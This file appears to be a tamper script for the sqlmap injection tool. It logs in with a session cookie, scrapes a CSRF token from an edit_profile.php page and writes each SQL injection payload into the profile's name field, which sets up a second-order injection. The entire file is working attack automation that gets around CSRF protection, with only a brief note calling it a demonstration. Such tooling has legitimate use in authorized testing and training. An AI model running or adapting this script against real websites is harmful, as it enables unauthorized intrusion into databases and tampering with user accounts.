import re
import requests
from lib.core.data import conf
from lib.core.data import logger
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    singleTimeWarnMessage('Tamper demonstrates how to update session data. To learn more, visit the repository: https://github.com/...')

def get_base_url():
    base_url = f"{conf.scheme}://{conf.hostname}"
    if conf.port and conf.port not in (80, 443):
        base_url += f":{conf.port}"
    
    return base_url    

def get_csrf_token(base_url, phpsessid):
    url = f"{base_url}/edit_profile.php"  
    cookies = {
        "PHPSESSID": phpsessid
    }

    resp = requests.get(url, cookies = cookies)
    if resp.status_code == 200:
        html = resp.text
        match = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']', html)
        if match:
            csrf_token = match.group(1)
            return csrf_token

    return False


def update_profile(base_url, phpsessid, csrf, payload):
    url = f"{base_url}/edit_profile.php"  
    conf.cookie

    cookies = {
        "PHPSESSID": phpsessid
    }

    data = {
        "csrf": csrf,
        "name": payload
    }

    resp = requests.post(url, cookies=cookies, data=data)
    if resp.status_code == 200:
        return True

    return False

def tamper(payload, **kwargs):
    base_url = get_base_url()
    phpsessid = conf.cookie.split("=")[-1]
    csrf = get_csrf_token(base_url=base_url, phpsessid=phpsessid)

    if csrf:
        update_result = update_profile(base_url=base_url, phpsessid=phpsessid, csrf=csrf, payload=payload)

    return payload
